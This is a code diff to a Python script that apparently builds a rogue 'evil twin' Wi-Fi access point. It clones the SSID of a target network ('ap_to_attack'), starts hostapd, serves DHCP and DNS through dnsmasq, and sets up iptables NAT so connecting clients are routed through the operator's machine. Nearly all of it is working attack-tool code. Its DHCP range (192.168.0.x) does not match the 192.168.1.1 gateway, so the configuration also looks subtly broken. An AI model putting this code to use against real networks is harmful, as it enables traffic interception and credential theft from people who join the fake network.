@@ -77,7 +77,7 @@ def setup_hostapd_conf(interface):
         f.write("ssid=%s\n" % ap_to_attack[1])
         f.write("driver=nl80211\n")
         f.write("hw_mode=g\n")
-        f.write("channel=1  \n")
+        f.write("channel=1\n")
         f.write("ieee80211n=1\n")
         f.write("macaddr_acl=0\n")
         f.write("auth_algs=1\n")
@@ -88,34 +88,35 @@ def setup_dnsmasq_conf(interface):
     print("[*] Setting up dnsmasq.conf for DHCP server")
     with open("/etc/dnsmasq.conf", "w") as f:
         f.write("interface=%s\n" % interface)
-        f.write("dhcp-range=192.168.0.2,192.168.0.150,12h\n")
+        f.write("dhcp-range=192.168.0.2,192.168.0.150,255.255.255.0,12h\n")
+        f.write("dhcp-option=3,192.168.1.1\n")
+        f.write("dhcp-option=6,192.168.1.1\n")
+        f.write("server=8.8.8.8\n")
+        f.write("listen-address=127.0.0.1\n")
 
 
 def setup_iptables(interface):
     #  set up iptables for access point
-    bash("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    bash("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE") #eth0 is interface (NOT the interface you are using as AP station) for internet access. eth0 for me means ethernet cable connected to my home router.
-    bash("iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT")
+    bash("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
     bash(f"iptables -A FORWARD -i {interface} -o eth0 -j ACCEPT")
-    #bash("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
+    bash("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 
 def setup_ap(interface):
     #  set up access point for client to connect to using hostapd
     print("[*] Setting up access point for client to connect to")
-    disable_monitor_mode(interface)
+    #  set up hostapd.conf
+    setup_hostapd_conf(interface)
+    bash(f"hostapd -B /etc/hostapd/hostapd.conf &")
+    #  set up dnsmasq.conf
     bash(f"ifconfig {interface} up 192.168.1.1 netmask 255.255.255.0")
     bash("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
-    #  set up dhcp server
     print("[*] Setting up dhcp server")
     setup_dnsmasq_conf(interface)
     bash(f"dnsmasq -C /etc/dnsmasq.conf &")
     #  set up iptables
     print("[*] Setting up iptables")
     setup_iptables(interface)
-    #  set up hostapd.conf
-    setup_hostapd_conf(interface)
-    bash(f"hostapd -B /etc/hostapd/hostapd.conf &")
     print("[*] Access point is up and ready")
 
 def killall():
